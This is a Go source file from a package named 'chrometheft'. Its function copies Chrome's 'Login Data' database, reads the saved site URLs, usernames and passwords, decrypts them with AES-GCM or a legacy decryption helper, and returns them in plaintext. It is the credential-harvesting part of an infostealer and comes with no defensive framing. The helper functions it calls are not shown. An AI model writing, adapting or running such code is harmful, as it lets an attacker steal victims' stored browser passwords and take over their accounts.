package chrometheft

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"errors"
	"fmt"
	"os"
	"strings"
)

type Password struct {
	URL      string `json:"url"`
	Username string `json:"username"`
	Password string `json:"password"`
}

func GetPasswords(path string) ([]Password, error) {
	passwords := make([]Password, 0)

	dbFile := path + "\\User Data\\Default\\Login Data"
	if !fileExists(dbFile) {
		return passwords, errors.New("Login Data file not found")
	}

	// make a copy of the login data file
	copyFile(dbFile, dbFile+".bak")
	dbFile += ".bak"

	// open the login data file
	db, err := sql.Open("sqlite3", dbFile)
	if err != nil {
		return passwords, err
	}

	// select rows from the login data file
	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
	if err != nil {
		return passwords, err
	}
	defer func() {
		// clean up
		rows.Close()
		db.Close()
		os.Remove(dbFile)
	}()

	// iterate over the rows
	for rows.Next() {
		var url, username, password string
		err = rows.Scan(&url, &username, &password)
		if err != nil {
			continue // make sure to iterate over all rows
		}

		var masterKey []byte = nil

		if strings.HasPrefix(password, "v10") { // chrome 80+
			if masterKey == nil { // get the master key if it's not already gotten
				masterKey, err = GetMasterKey(path)
				if err != nil {
					return passwords, err
				}
			}

			c, err := aes.NewCipher(masterKey)
			if err != nil {
				continue
			}
			gcm, err := cipher.NewGCM(c)
			if err != nil {
				continue
			}
			nonceSize := gcm.NonceSize()
			cipherText := []byte(password[3:])
			if len(cipherText) < nonceSize {
				continue
			}

			nonce, cipherText := cipherText[:nonceSize], cipherText[nonceSize:]
			plainText, err := gcm.Open(nil, nonce, cipherText, nil)
			if err != nil {
				fmt.Println(err)
			}
			password = string(plainText)

			if url != "" && username != "" && password != "" {
				passwords = append(passwords, Password{URL: url, Username: username, Password: password})
			}
		} else {
			pwd, err := Decrypt([]byte(password))
			if err != nil {
				continue
			}
			password = string(pwd)

			if url != "" && username != "" && password != "" {
				passwords = append(passwords, Password{URL: url, Username: username, Password: password})
			}
		}
	}

	return passwords, nil
}
